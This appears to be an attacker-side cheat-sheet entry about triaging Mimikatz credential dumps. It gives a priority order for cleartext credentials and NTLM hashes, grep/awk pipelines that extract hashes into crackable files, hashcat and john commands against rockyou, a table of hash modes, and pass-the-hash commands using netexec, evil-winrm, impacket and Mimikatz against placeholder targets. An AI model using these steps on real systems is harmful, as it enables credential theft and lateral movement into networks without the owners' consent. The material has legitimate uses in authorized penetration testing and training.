title: Mimikatz Output — Parse, Triage, and Prep for Cracking
body:
Mimikatz dumps two fundamentally different formats depending on which module you ran, and the grep commands that work on one silently return nothing on the other. Know which you have before you grep anything.

sekurlsa::logonpasswords — reads live LSASS memory. Fields are prefixed with '* ' and formatted as '* NTLM : <hash>'. This is the dump to run when a user is actively logged on — it picks up sessions, cached RDP logins, and (if WDigest is on) plaintext passwords.

lsadump::sam — reads the SAM hive on disk. Fields are prefixed with 'Hash NTLM: <hash>'. This gives you local account hashes that survive reboots. No session needed, but it only covers local accounts — not domain accounts that have never logged on locally.

— TRIAGE ORDER — what to look at first —

  1. credman blocks       Cleartext passwords stored by Windows Credential Manager.
                          These are goldmine — admin RDP creds, service accounts, etc.
                          Check EVERY user's credman section, not just Administrator.

  2. wdigest Password     Cleartext if on older/unpatched systems (pre-KB2871997).
                          Default OFF on Win 8.1+ / 2012 R2+. If you see it, take it.

  3. msv NTLM             Your bread-and-butter PTH hash. Always present if the dump
                          succeeded and the account isn't null/empty.

  4. kerberos Password    Occasionally cleartext on older systems. Usually null.

  5. kerberos AES256/128  Pull these if you need Overpass-the-Hash on a modern domain
                          (RC4 may be blocked; AES keys always work).

— FILTER THESE OUT — they are always useless —

  aad3b435b51404eeaad3b435b51404ee   LM hash for empty password — placeholder, not real
  000000000000000000000000000000000  Null NTLM — account has no password or wasn't captured

— ACCOUNT TYPES AND WHAT TO DO WITH THEM —

  Named accounts (user, apache, svc_*)   PTH or crack → spray everywhere
  Administrator                           PTH directly → local admin on other boxes
  cloudbase-init                          Cloud provisioning — try on all boxes in the same
                                          template; often reused across the environment
  MACHINE$ (computer accounts)            Skip for PTH. Use for Kerberos (S4U, RBCD) only.
  LOCAL SERVICE / NETWORK SERVICE         Skip — built-in pseudo-accounts, not usable. EASY PATH: parse_mimi.py auto-detects the format and writes crack/ref/cleartext files — use it instead of manual grep/awk. Manual commands kept as fallback.
cmd:
# ══════════════════════════════════════════════════
# ⭐ EASY WAY — parse_mimi.py (your script — use this first)
# ══════════════════════════════════════════════════
# Auto-detects sekurlsa / lsadump::sam / dcsync. Writes 3 files + prints
# the hashcat commands. No manual grep/awk needed.
#
# 1. Save mimikatz output to a file (or pipe it):
#    (paste output into mimi.txt, or  mimikatz.exe ... > mimi.txt)
#
# 2. Run the parser:
python3 parse_mimi.py mimi.txt
#    or from stdin:   cat mimi.txt | python3 parse_mimi.py -
#    force a format:  python3 parse_mimi.py mimi.txt -f sam
#
# 3. It writes (next to the input):
#    mimi_crack.txt      → raw NTLM hashes    → hashcat -m 1000
#    mimi_ref.txt        → domain\user:hash   → reference / john user:hash
#    mimi_cleartext.txt  → user:pass:domain   → wdigest + credman plaintext
#
# 4. Crack (the parser prints these for you):
hashcat -m 1000 mimi_crack.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 mimi_crack.txt --show
#
# 5. Or skip cracking — PTH with anything in mimi_ref.txt (see PTH section below).
#
# Cleartext (wdigest/credman) is printed FIRST by the tool — always check it,
# it's the highest-value loot and needs no cracking.

# ══════════════════════════════════════════════════
# 📖 MANUAL WAY (fallback — if the script isn't on the box)
# ══════════════════════════════════════════════════
# ══════════════════════════════════════════════════
# WHICH MODULE DID YOU RUN?
# ══════════════════════════════════════════════════
# sekurlsa::logonpasswords  ->  fields start with '* '
# lsadump::sam              ->  fields start with 'Hash NTLM:'

# ══════════════════════════════════════════════════
# TRIAGE — CLEARTEXT FIRST
# ══════════════════════════════════════════════════

# All non-null passwords (wdigest + credman) — run this first, always:
grep -i "password" mimikatz.txt | grep -v "(null)" | grep -v "Password : (null)"

# credman blocks specifically (where RDCMan/saved creds live):
awk '/credman/,/cloudap/' mimikatz.txt | grep -E "Username|Domain|Password" | grep -v "(null)"

# ══════════════════════════════════════════════════
# SEKURLSA::LOGONPASSWORDS — PARSE NTLM HASHES
# ══════════════════════════════════════════════════

# Hashcat-ready file (raw hashes, one per line, mode 1000):
grep "\* NTLM" mimikatz.txt | awk '{print $4}' | grep -v "aad3b435\|000000000" | sort -u > ntlm_crack.txt
hashcat -m 1000 ntlm_crack.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 ntlm_crack.txt --show        # re-display cracked from potfile

# Username:hash reference file (also valid for john):
grep -E "\* Username|\* NTLM" mimikatz.txt \
  | paste - - \
  | awk '{print $3":"$4}' \
  | grep -v "null\|aad3b435\|000000000" \
  | sort -u > ntlm_ref.txt
cat ntlm_ref.txt

# All non-null plaintext passwords with username:
grep -E "\* Username|\* Password" mimikatz.txt \
  | paste - - \
  | awk '{print $3":"$4}' \
  | grep -v "(null)" > cleartext_ref.txt

# ══════════════════════════════════════════════════
# LSADUMP::SAM — PARSE NTLM HASHES
# ══════════════════════════════════════════════════

# Hashcat-ready (mode 1000 — same as above):
grep "Hash NTLM" mimikatz.txt | awk '{print $3}' | grep -v "aad3b435\|000000000" | sort -u > ntlm_crack.txt
hashcat -m 1000 ntlm_crack.txt /usr/share/wordlists/rockyou.txt

# Username:hash reference:
grep -E "^User :|Hash NTLM" mimikatz.txt \
  | paste - - \
  | awk '{print $2":"$4}' \
  | grep -v "aad3b435\|000000000" \
  | sort -u > ntlm_ref.txt
cat ntlm_ref.txt

# ══════════════════════════════════════════════════
# JOHN — SAME FILE, DIFFERENT SYNTAX
# ══════════════════════════════════════════════════
# john accepts the same raw hash file (one hash per line) OR user:hash format:
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt ntlm_crack.txt
john --show ntlm_crack.txt

# ══════════════════════════════════════════════════
# HASH FORMAT CHEAT SHEET
# ══════════════════════════════════════════════════
# Hash type            hashcat mode   source
# NTLM (SAM/lsass)     1000           lsadump::sam, sekurlsa::logonpasswords
# NTLMv2 (net hash)    5600           Responder, mitm6  (format: user::DOM:chal:hash:blob)
# Kerberoast TGS       13100          GetUserSPNs ($krb5tgs$23$)
# AS-REP               18200          GetNPUsers ($krb5asrep$23$)
# Kerberoast AES       19700          GetUserSPNs ($krb5tgs$18$)
# AS-REP AES           19600          GetNPUsers ($krb5asrep$18$)
# MSCACHEv2 (cached)   2100           lsadump::cache (domain creds, offline only)
# DPAPI masterkey      15900          mimikatz dpapi

# ══════════════════════════════════════════════════
# VALIDATE PARSED HASHES BEFORE CRACKING
# ══════════════════════════════════════════════════
cat ntlm_crack.txt            # should be 32-char hex strings only
wc -l ntlm_crack.txt          # count should match number of real accounts
awk '{print length}' ntlm_crack.txt  # every line should be exactly 32

# ══════════════════════════════════════════════════
# PTH WITHOUT CRACKING — USE THE HASH DIRECTLY
# ══════════════════════════════════════════════════
# No need to crack if you just want access — PTH directly:
netexec smb <target> -u USER -H NTHASH
netexec winrm <target> -u USER -H NTHASH
evil-winrm -i <target> -u USER -H NTHASH
impacket-psexec DOMAIN/USER@<target> -hashes :NTHASH
impacket-wmiexec DOMAIN/USER@<target> -hashes :NTHASH
# In mimikatz directly (spawns new process as that user):
# sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:HASH /run:powershell.exe
warn: The grep for sekurlsa output ('* NTLM') and lsadump::sam output ('Hash NTLM') are mutually exclusive — running the wrong one silently produces an empty file with no error. Check which module produced your output first. Also: sort -u deduplicates hashes, which is correct for cracking but means your ntlm_ref.txt may be shorter than expected if multiple accounts share the same NTLM hash (common for accounts with the same password or accounts that were never initialized).
